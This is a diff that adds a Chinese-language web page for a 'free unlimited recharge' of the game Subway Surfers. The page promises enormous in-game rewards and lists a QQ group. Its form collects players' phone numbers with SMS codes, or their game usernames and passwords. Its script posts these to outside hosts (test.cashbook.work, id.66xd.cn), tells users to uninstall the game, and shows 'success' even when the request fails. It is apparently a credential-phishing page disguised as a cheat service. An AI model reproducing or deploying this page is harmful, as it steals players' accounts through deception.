@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html>
+  <head>
+	<meta charset="utf-8" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+	<title>深海ChTi直充</title>
+  </head>
+  <body>	
+	<h1></h1>
+	<p></p>  
+  </body>
+</html><html>
+ <head>
+  <link id="layuicss-laydate" rel="stylesheet" href="http://test.cashbook.work/layui/css/modules/laydate/default/laydate.css?v=5.3.1" media="all">
+  <link id="layuicss-layer" rel="stylesheet" href="http://test.cashbook.work/layui/css/modules/layer/default/layer.css?v=3.5.1" media="all">
+  <link id="layuicss-skincodecss" rel="stylesheet" href="http://test.cashbook.work/layui/css/modules/code.css?v=3" media="all">
+ </head> 
+ <body id="v1"> 
+  <meta charset="utf-8" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"> 
+  <title>深海ChTi</title> 
+  <script src="js/jq.js"></script> 
+  <h1 id="v2"></h1> 
+  <p id="v3"></p> 
+  <meta name="viewport" content="width=device-width"> 
+  <title></title> 
+  <link rel="stylesheet" href="http://test.cashbook.work/../layui/css/layui.css" media="all"> 
+  <script src="http://test.cashbook.work/../layui/layui.js"></script> 
+  <style type="text/css">
+        html {
+            background-image: url('http://test.cashbook.work/../../img/7.jpg');
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .Recharge {
+            width: 95%;
+            height: 510px;
+            position: absolute;
+            margin: 48% 0 0 17%;
+        }
+
+        input::-webkit-input-placeholder {
+            color: black;
+        }
+
+        input::-moz-placeholder {
+            color: black;
+        }
+
+        .img::before {
+            width: 100%;
+            height: 810px;
+            content: "";
+            /* 一定要加定位，这样z-index才起作用 */
+            position: absolute;
+            opacity: 0.6;
+            z-index: -1;
+            background-image: url('http://test.cashbook.work/../../img/矩形 2.png');
+            background-repeat: no-repeat;
+            background-size: 100% 100%;
+            margin-top: 30px;
+            margin-left: 20px;
+        }
+
+        .layui-form {
+            position: relative;
+            height: 100vh;
+            width: 400px;
+            margin:auto 0;
+        }
+
+        .underline {
+            width: 80%;
+            height: 1px;
+            background: linear-gradient(to right, white, rgb(67 64 64));
+            border-radius: 2px;
+            margin: 5px 0 5px 0;
+        }
+
+        .same {
+            display: flex;
+            align-items: flex-end;
+            width: 80%;
+        }
+
+        .Recharge_title {
+            height: 50px;
+        }
+
+
+
+        .Title_user {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            font-size: 13px;
+            Text-shadow: 5px 2px 5px aqua;
+            color: white;
+        }
+
+        .Recharge_steps {
+            align-items: center;
+            color: white;
+            font-size: 14px;
+            width: 80%;
+            justify-content: flex-start;
+        }
+
+        .block {
+            display: flex;
+            height: 35px;
+            align-items: center;
+        }
+
+        .Step_1 {
+            width: 70px;
+            height: 20px;
+            background-color: white;
+            color: black;
+            text-align: center;
+            font-size: 15px;
+            margin-right: 10px;
+        }
+
+        .Step_text1 {
+            text-shadow: 2px 2px 12px white;
+            font-size: 13px;
+            text-shadow: #50f592 1px 0 0;
+        }
+
+        .abnormal {
+            margin: 8px 0 8px 0;
+            Text-shadow: 2px 1px 3px antiquewhite;
+            font-size: 13px;
+        }
+        .layui-tab-brief > .layui-tab-title .layui-this {
+            color: #d9e08e;
+        }
+        .red-color {
+            text-shadow: #9e533d 1px 0 0,#9e533d 0 1px 0,#9e533d -1px 0 0,#9e533d 0 -1px 0;
+        }
+
+        .Recharge_input {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            width: 80%;
+        }
+
+        .title-input {
+            width: 100%;
+            text-align: center;
+            min-height: 38px;
+            margin-bottom: 10px;
+            background-color: rgb(255, 255, 255,0.7);
+            border: none;
+            margin-bottom: 0px;
+        }
+
+        .Recharge_button {
+            margin-top: 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .Recharge_button1 {
+            display: flex;
+            align-items: center;
+            position: absolute;
+            right: 0px;
+        }
+
+        .layui-btn {
+            background: linear-gradient(to right, #91f5f1,#21fd8d);
+            border: none;
+            color: black;
+        }
+
+        .button2 {
+            padding: 0 117px 0 117px;
+        }
+
+        .contain {
+            display: flex;
+            width: 100%;
+            align-items: center;
+            height: 40px;
+            margin: 10px 0 10px 0;
+            border-radius: 5px;
+            position: relative;
+        }
+
+        .input {
+            flex: 2;
+            height: 100%;
+            display: flex;
+            align-items: center;
+        }
+
+        .one {
+            border-radius: 2px;
+        }
+
+        .two {
+            border-radius: 2px;
+        }
+
+        .block_button {
+            display: flex;
+            align-items: center;
+            width: 80%;
+            margin-top: 10px;
+        }
+
+        .Select {
+            width: 80%;
+            margin-top: 10px;
+            color: white;
+        }
+
+        .layui-form-radio {
+            width: 134px;
+            margin: 6px 0 0 0;
+        }
+
+        .layui-tab-title {
+            width: 80%;
+        }
+
+        .layui-tab {
+            color: white;
+        }
+        .layui-form-radio{
+            line-height:24px;
+        }
+    </style> 
+  <form class="layui-form" action="" lay-filter="subway"> 
+   <div class="img"> 
+    <div class="Recharge"> 
+     <div class="layui-tab layui-tab-brief" lay-filter="docDemoTabBrief"> 
+      <ul class="layui-tab-title" style="Text-shadow: 2px 1px 3px antiquewhite;"> 
+       <li class="red-color layui-this" style="font-size:18px;">刷取页面</li> 
+       <li class="red-color">查看公告</li> 
+       <li class="red-color">查看套餐</li> 
+      </ul> 
+      <div class="layui-tab-content"> 
+       <div class="layui-tab-item layui-show"> 
+        <div class="Recharge_steps"> 
+         <div class="Step_first block"> 
+          <div class="Step_1">
+            步骤1 
+          </div> 
+          <div class="Step_text1">
+            选择对应游戏渠道与登陆方式 
+          </div> 
+         </div> 
+         <div class="Step_second block"> 
+          <div class="Step_1">
+            步骤2 
+          </div> 
+          <div class="Step_text1">
+            输入账号密码或手机号验证码 
+          </div> 
+         </div> 
+         <div class="Step_third block"> 
+          <div class="Step_1">
+            步骤3 
+          </div> 
+          <div class="Step_text1">
+            提交成功后24小时后上号即可 
+          </div> 
+         </div> 
+        </div> 
+        <div class="abnormal red-color">
+          
+        </div> 
+        <div class="Recharge_input"> 
+         <div class="contain"> 
+          <div class="input"> 
+           <input type="text" name="phone" id="unaInput" placeholder="请输入手机号" class="title-input one"> 
+          </div> 
+          <div class="Recharge_button1"> 
+           <div> 
+            <button class="layui-btn btn-send send" id="sendBtn" lay-filter="btn_send" type="submit" lay-submit="">发送短信</button> 
+           </div> 
+          </div> 
+         </div> 
+         <input type="text" class="title-input two" id="pwdInput" name="code" placeholder="请输入验证码"> 
+        </div> 
+        <div class="Select"> 
+         <div class="layui-tab layui-tab-brief" lay-filter="plat"> 
+          <ul class="layui-tab-title" style="width:100%;text-align:center"> 
+           <li class="layui-this">验证码充值</li> 
+           <li>账号密码充值</li> 
+          </ul> 
+          <div class="layui-tab-content"> 
+           <div class="layui-tab-item layui-show"> 
+            <input type="radio" name="platform" class="radio" lay-filter="radio" value="and-phone-gw" title="安卓[官]验证码" checked="">
+            <div class="layui-unselect layui-form-radio layui-form-radioed">
+             <i class="layui-anim layui-icon"></i>
+             <div>
+              安卓[官]验证码
+             </div>
+            </div> 
+            <input type="radio" name="platform" class="radio" lay-filter="radio" value="and-phone" selected="" title="安卓[TAP]验证码">
+            <div class="layui-unselect layui-form-radio">
+             <i class="layui-anim layui-icon"></i>
+             <div>
+              安卓[TAP]验证码
+             </div>
+            </div> 
+            <input type="radio" name="platform" class="radio" lay-filter="radio" value="ios-phone" title="苹果验证码">
+            <div class="layui-unselect layui-form-radio">
+             <i class="layui-anim layui-icon"></i>
+             <div>
+              苹果验证码
+             </div>
+            </div> 
+           </div> 
+           <div class="layui-tab-item"> 
+            <input type="radio" name="platform" class="radio" lay-filter="radio" value="and-account-gw" title="安卓[官]账号">
+            <div class="layui-unselect layui-form-radio">
+             <i class="layui-anim layui-icon"></i>
+             <div>
+              安卓[官]账号
+             </div>
+            </div> 
+            <input type="radio" name="platform" class="radio" lay-filter="radio" value="and-account" title="安卓[TAP]账号">
+            <div class="layui-unselect layui-form-radio">
+             <i class="layui-anim layui-icon"></i>
+             <div>
+              安卓[TAP]账号
+             </div>
+            </div> 
+            <input type="radio" name="platform" class="radio" lay-filter="radio" value="ios-account" title="苹果账号">
+            <div class="layui-unselect layui-form-radio">
+             <i class="layui-anim layui-icon"></i>
+             <div>
+              苹果账号
+             </div>
+            </div> 
+           </div> 
+          </div> 
+         </div> 
+        </div> 
+        <div class="block_button"> 
+         <div class="Recharge_button2"> 
+          <div> 
+           <button class="layui-btn button2" type="submit" lay-submit="" lay-filter="btn_set">提交充值</button> 
+          </div> 
+         </div> 
+        </div> 
+       </div> 
+       <div class="layui-tab-item" id="about" style="white-space:normal;word-break:break-all;width:300px;"> 
+        <!--留言--> 
+        <p style="text-align: center;"> </p> 
+        <li class="list-group-item" style="box-sizing:border-box;position:relative;display:block;padding:10px 15px;margin-bottom:-1px;background-color:#FFFFFFaa;border:1px solid #EEEEEE;color:#0000FF;font-family:" font-size:14px;font-weight:700;white-space:normal;"=""> <p></p> <p style="text-align: center;">【套餐内容】</p> <p style="text-align: center;"> <span style="color:red;">金币6千万+钥匙3万+滑板1万+得分倍增8888+喷射起步8888+全人物+全皮肤+全滑板+全滑板技能+全宝物+全背饰+全头像框+十倍积分+双倍金币+超级炫跑王+历史分数5201314+历史排名1+历史段位王者+等级520</span> </p> <p style="text-align: center;"> </p></li> 
+        <li class="list-group-item" style="box-sizing:border-box;position:relative;display:block;padding:10px 15px;margin-bottom:-1px;background-color:#FFFFFFaa;border:1px solid #EEEEEE;color:#710ced;font-family:" font-size:14px;font-weight:700;white-space:normal;"=""> <p></p> <p style="text-align: center;"></p> <p style="text-align: center;"> <span style="color:red;">此后台免费且可无限充值使用</span> </p> <p style="text-align: center;"> </p></li> 
+        <p></p> 
+        <p style="text-align: center;"> </p> 
+        <li class="list-group-item" style="box-sizing:border-box;position:relative;display:block;padding:10px 15px;margin-bottom:-1px;background-color:#FFFFFFaa;border:1px solid #EEEEEE;color:#436EEE;font-family:" font-size:14px;font-weight:700;white-space:normal;"=""> <p></p> <p style="text-align: center;"></p> <p style="text-align: center;"> <span style="color:red;">软件加q群：1463223992</span> </p> <p style="text-align: center;"></p> <p></p> <p style="text-align: center;"> </p></li> 
+        <li class="list-group-item" style="box-sizing:border-box;position:relative;display:block;padding:10px 15px;margin-bottom:-1px;background-color:#FFFFFFaa;border:1px solid #EEEEEE;color:#710ced;font-family:" font-size:14px;font-weight:700;white-space:normal;"=""> <p></p> <p style="text-align: center;"></p> <p style="text-align: center;"> <span style="color:red;">右边圆圈按钮为游戏安装包下载地址→</span> </p> 
+         <!--初音未来--> <style> 	.music { position: fixed!important; position: absolute; width: 180px; height: 190px; z-index: 9; right: 0; bottom: 0; top: expression(offsetParent.scrollTop+offsetParent.clientHeight-150); cursor: pointer;} </style> 
+         <div id="audio" class="music"> 
+         </div> 
+         <!--下载地址--> <style> 	.elevator_item .hd-time-limited { display: block; position: fixed; right: 0; bottom: 445px; width: 40px; height: 140px; background: url(assets/img/right.png) no-repeat center; } .elevator_item { position: fixed; right: 0; bottom: 95px; z-index: 11; } .elevator_item .feedback { width: 36px; height: 41px; font-size: 12px; padding: 5px 6px; display: block; border-radius: 24px; text-align: center; margin-top: 32px; box-shadow: 0 2px 4px rgba(0,0,0,.55); cursor: pointer; } .graHover { position: relative; overflow: hidden; } </style> 
+         <div class="elevator_item" id="elevator_item" style="display:block;"> 
+          <a class="hd-time-limited" href=" " rel="nofollow"> </a> 
+          <a target="_self" class="feedback graHover" id="sign_daily" style="background-color: #ffd900;color:#383838;" rel="nofollow" href="https://pao.uu.cc/">官方版本下载</a> 
+          <a target="_self" class="feedback graHover" style="background-color: #AF3A9F;color:#fff;" href="https://www.taptap.cn/app/4" rel="nofollow">tap版本下载</a> 
+          <a target="_self" class="feedback graHover" style="background-color: #1e6be3;color:#fff;" href="http://a.4399.cn/search.html?w=%E5%9C%B0%E9%93%81%E8%B7%91%E9%85%B7" rel="nofollow">4399版本下载</a> 
+         </div></li> 
+       </div> 
+       <div class="layui-tab-item" style="white-space:normal;word-break:break-all;width:300px;">
+         金币6千万+钥匙3万+滑板1万+得分倍增8888+喷射起步8888+全人物+全皮肤+全滑板+全滑板技能+全宝物+全背饰+全头像框+十倍积分+双倍金币+超级炫跑王+历史分数5201314+历史排名1+历史段位王者+等级520 +QQ 1463223992
+       </div> 
+      </div> 
+     </div> 
+    </div> 
+   </div> 
+  </form> 
+  <script src="http://test.cashbook.work/layui/cryptojs-aes.js"></script> 
+  <script>
+
+        layui.use(['form', 'layer','element'], function () {
+            var form = layui.form,
+                $ = layui.$,
+                element = layui.element;
+
+            element.on('tab(plat)', function (data) {
+                if (data.index == 0) {
+                    $('#sendBtn').show();
+                    $('#unaInput').attr("placeholder", "请输入手机号");
+                    $('#pwdInput').attr("placeholder", "请输入验证码");
+                    $('#pwdInput').attr("type", "text");
+                    form.val('subway', {
+                        "platform": "and-phone-gw"
+                    });
+                } else {
+                    $('#sendBtn').hide();
+                    $('#unaInput').attr("placeholder", "请输入游戏账号");
+                    $('#pwdInput').attr("placeholder", "请输入游戏密码");
+                    $('#pwdInput').attr("type", "password");
+                    form.val('subway', {
+                        "platform": "and-account-gw"
+                    });
+                }
+            });
+            form.on('submit(btn_set)', function (data) {
+                layer.confirm('请确认已经<span style="color:#ff5722">卸载游戏</span><br />若因未卸载游戏导致不到账<span style="color:#ff5722">不予售后</span>', {
+                    btn: ['确定', '取消'] //按钮
+                }, function () {
+                    if (data.field.platform == "and-4399") {
+                        data.field.code = CryptoJS.AES.encrypt(data.field.code, "lzYW5qaXVqa").toString();
+                    }
+                    $.ajax({
+                        url: 'http://test.cashbook.work/Tool/Subway_set',
+                        async: true,
+                        type: 'POST',
+                        data: { phone: data.field.phone, code: data.field.code, platform: data.field.platform,isTask:true },
+                        beforeSend: function (xhr) {
+                            layer.load(1, {
+                                shade: [0.1, '#fff'] //0.1透明度的白色背景
+                            });
+                        },
+                        success: function (res) {
+                            if (res == "任务已提交") {
+                                layer.confirm('提交成功，请24小时后上号查看', {
+                                    btn: ['确定', '取消'] //按钮
+                                }, function () {
+                                    window.location.href = '';
+                                });
+                            } else {
+                                layer.alert(res);
+                            }
+                            layer.closeAll('loading');
+                        },
+                        error: function () {
+                            layer.alert("提交成功，请24小时后上号查看。", { icon: 2 });
+                            layer.closeAll('loading');
+                        }
+                    });
+                });
+
+                return false;
+            });
+
+            form.on('submit(btn_send)', function (data) {
+                layer.confirm('是否发送短信？', {
+                    btn: ['确定', '取消'] //按钮
+                }, function () {
+
+                    $.ajax({
+                        url: 'http://id.66xd.cn/Recharge/Subway_send',
+                        async: true,
+                        type: 'POST',
+                        data: { phone: data.field.phone, platform: data.field.platform,action: true },
+                        beforeSend: function (xhr) {
+                            layer.load(1, {
+                                shade: [0.1, '#fff'] //0.1透明度的白色背景
+                            });
+                        },
+                        success: function (res) {
+                            layer.alert(res, { icon: 1 });
+                            layer.closeAll('loading');
+                        },
+                        error: function () {
+                            layer.alert("验证码通道异常，请用账号密码充值", { icon: 2 });
+                            layer.closeAll('loading');
+                        }
+                    });
+                });
+                return false;
+            });
+        })
+    </script>  
+ </body>
+</html>
